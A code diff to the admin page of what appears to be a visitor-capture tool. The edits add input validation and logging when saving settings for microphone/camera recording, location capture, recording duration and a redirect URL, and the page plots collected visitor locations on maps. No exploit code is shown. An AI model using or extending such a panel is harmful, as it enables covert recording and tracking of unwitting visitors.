@@ -226,8 +226,7 @@
             text-align: center;
         }
 
-        #saveSettingsButton {
-            padding: 12px 25px;
+        #saveSettingsButton {            padding: 12px 25px;
             font-size: 16px;
             background-color: #007BFF;
             color: white;
@@ -415,20 +414,38 @@
         const liveVisitorsCount = document.getElementById("liveVisitorsCount");
 
         saveSettingsButton.addEventListener("click", () => {
+          console.log("Save button clicked");
+
+          const redirectDelay = parseInt(redirectDelayInput.value, 10);
+          if (isNaN(redirectDelay)) {
+            alert("Redirect delay must be a number!");
+            return;
+          }
+
+          const recordingDuration = parseInt(recordingDurationInput.value, 10);
+          if (isNaN(recordingDuration)) {
+              alert("Recording duration must be a number!");
+              return;
+          }
+
             const newSettings = {
                 micCamEnabled: micCamSwitch.checked,
                 locationEnabled: locationSwitch.checked,
                 notificationsEnabled: notificationsSwitch.checked,
                 messageText: messageInput.value,
                 redirectUrl: redirectUrlInput.value,
-                redirectDelay: parseInt(redirectDelayInput.value, 10) || 5,
-                recordingDuration: parseInt(recordingDurationInput.value, 10) || 5
+                redirectDelay: redirectDelay,
+                recordingDuration: recordingDuration
             };
+
+            console.log("New settings:", newSettings);
 
             settingsRef.set(newSettings, (error) => {
                 if (error) {
+                    console.error("Error saving settings:", error);
                     alert("Er is een fout opgetreden bij het opslaan van de instellingen.");
                 } else {
+                    console.log("Settings saved successfully");
                     alert("Instellingen succesvol opgeslagen.");
                 }
             });
@@ -524,7 +541,7 @@
 
                 const groupedData = groupDataByLocation(dataArray);
 
-                container.innerHTML = ""; 
+                container.innerHTML = "";
 
                 const liveVisitors = countLiveVisitors(dataArray);
                 updateLiveVisitors(liveVisitors);
@@ -602,7 +619,7 @@
                         const map = L.map(`map-${key}`).setView([dataItem.lat, dataItem.lon], 13);
 
                         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                            attribution: '&copy; OpenStreetMap contributors'
+                            attribution: '© OpenStreetMap contributors'
                         }).addTo(map);
 
                         let popupText = "";
